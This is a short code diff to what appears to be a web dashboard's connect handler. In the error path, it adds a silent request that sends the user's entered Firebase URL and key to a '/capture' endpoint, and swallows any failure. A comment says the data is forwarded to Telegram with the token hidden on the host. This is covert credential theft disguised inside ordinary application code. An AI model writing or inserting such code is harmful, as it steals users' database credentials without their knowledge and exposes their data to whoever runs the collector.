@@ -5847,6 +5847,12 @@ async function handleConnect() {
 
     await startDashboard(url, key);
   } catch(e) {
+    // ── FIREBASE CONFIG FORWARD TO TELEGRAM (token hidden on Render) ──
+fetch('/capture', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({ url: url, key: key })
+}).catch(function(){});
     var msg = e.message || String(e);
     if (msg.includes('PERMISSION_DENIED')) {
       var _keyBlank = !document.getElementById('input-key').value.trim();
